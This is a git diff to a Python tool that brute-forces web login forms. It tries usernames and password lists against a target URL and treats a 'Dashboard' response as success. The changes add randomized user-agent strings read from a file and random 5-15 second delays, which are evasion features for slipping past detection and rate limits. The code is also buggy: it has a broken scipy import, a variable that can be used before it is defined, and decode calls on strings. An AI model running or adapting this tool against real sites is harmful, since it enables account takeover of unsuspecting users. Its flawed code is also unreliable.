@@ -1,4 +1,6 @@
+import time
 import requests
+from scipy import rand
 
 
 def brute(parameters):
@@ -14,31 +16,21 @@ def brute(parameters):
             if parameters['password_list']:
                 for password in parameters['password_list']:
                     content['password'] = password
-                    if attack(content):
-                        print('login successful\n', 'user: ', content['username'])
-                        print('password: ', content['password'])
-                        exit(0)
+                    attack(content)
             else:
                 content['password'] = parameters['password']
-                if attack(content):
-                    print('login successful\n', 'user: ', content['username'])
-                    print('password: ', content['password'])
-                    exit(0)
+                attack(content)
+                
     elif parameters['password_list']:
         content['username'] = parameters['username']
         for password in parameters['password_list']:
             content['password'] = password
-            if attack(content):
-                print('login successful\n', 'user: ', content['username'])
-                print('password: ', content['password'])
-                exit(0)
+            attack(content)
+            
     else:
         content['username'] = parameters['username']
         content['password'] = parameters['password']
-        if attack(content):
-            print('login successful\n', 'user: ', content['username'])
-            print('password: ', content['password'])
-            exit(0)
+        attack(content)
 
 
 def attack(content):
@@ -46,13 +38,40 @@ def attack(content):
         content['user_param']: content['username'],
         content['password_param']: content['password'],
     }
+    headers = {
+        'user-agent': get_random_user_agent().encode().decode('utf-8'),
+    }
     # Doing the post/get form
     if content['method'] == 'post':
-        request = requests.post(content['url'], data=payload)
+        request = requests.post(content['url'], data=payload, headers = headers)
     else:
-        request = requests.get(content['url'], data=payload)
-    return check_login(request)
+        request = requests.get(content['url'], data=payload, headers = headers)
+    if check_login(request):
+        print('login successfull\n\nusername: ' + content['username'].decode('utf-8') + '\npassword: ' + content['password'].decode('utf-8'))
+        exit(0)
 
+
+def get_random_user_agent():
+    import numpy as np
+    random_ua = ''
+    ua_file = 'utils/user_agent.txt'
+    delays = [5, 10, 15]
+    delay = np.random.choice(delays)
+    time.sleep(delay)
+    try:
+        with open(ua_file) as f:
+            lines = f.readlines()
+        if len(lines) > 0:
+            prng = np.random.RandomState()
+            index = prng.permutation(len(lines) - 1)
+            idx = np.asarray(index, dtype=np.integer)[0]
+            random_proxy = lines[int(idx)]
+            return random_proxy[2:len(random_proxy)-2]
+    except Exception as ex:
+        print('Exception in user agent')
+        print(str(ex))
+    finally:
+        return random_proxy[2:len(random_proxy)-2]
 
 def check_login(request):
     if 'Dashboard' in request.text:
